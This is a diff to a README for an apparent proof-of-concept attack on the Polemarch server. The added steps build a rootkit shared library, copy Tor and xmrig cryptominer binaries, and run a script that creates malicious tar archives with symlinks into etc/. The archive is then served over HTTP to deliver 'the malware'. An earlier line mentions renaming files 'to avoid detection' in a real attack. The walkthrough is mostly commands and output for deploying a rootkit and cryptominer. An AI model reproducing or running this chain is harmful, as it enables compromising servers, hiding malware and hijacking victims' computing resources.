@@ -46,20 +46,54 @@ Note: in the real exploit we would change some names to avoid detection.
 In order to deploy the malware we will have to set up:
 
 - Polemarch server 
-- Server hosting the compromised tar files
+- Generate tar with the malware
+- Create server hosting the compromised tar files
 
+### Polemarch server
 First, deploy the polemarch server (with vagrant or docker):
 
-Generate the tar files and host the tar files (example using python localhost server). Configure the server to listen in an interface
-accesible from the docker container:
+```bash
+$: docker compose build 
+$: docker compose up -d
+```
+
+And open the web interface at http://localhost:8080
+
+Or with vagrant:
 
 ```bash
-$: cd poc
+$: vagrant up
+```
 
-# Copy tor and xmrig binaries
-$: cp ../cryptominer/tor .
-$: cp ../cryptominer/xmrig .
+And open the web interface at http://localhost:8085
 
+### Generate tar files
+The tar files will be generated in the `poc/tar/` folder.
+
+But first, we need to set up all the files for generating the tar correctly.
+
+1. Copy the binaries to the `poc` folder:
+
+```bash
+$: cp cryptominer/tor poc/
+$: cp crytominer/xmrig poc/
+```
+
+2. Generate the rootkit shared library in the `poc/rootkit` folder:
+
+```bash
+$(rootkit): make
+```
+
+3. Copy the rootkit shared library to the `poc` folder:
+
+```bash
+$: cp rootkit/rootkit.so poc/
+```
+
+And then we can generate the tar files:
+
+```bash
 # Execute tar files generator
 $: python3 tar.py
 [*] Creating symlink aaaa -> etc/
@@ -79,9 +113,15 @@ $: python3 tar.py
 [*] Removing symlink bbbb
 [*] Removing symlink cccc
 [*] Removing symlink dddd
+```
 
-# Server python server from tar directory
-$: cd tar
+This will generate the following tar files:
+- `poc/tar/rootkit.tar.gz`: tar file with the malware
+
+### Server hosting the tar files
+Host the tar files, for example with python:
+```bash
+$: cd poc/tar
 $: python -m http.server 3005
 ```
 
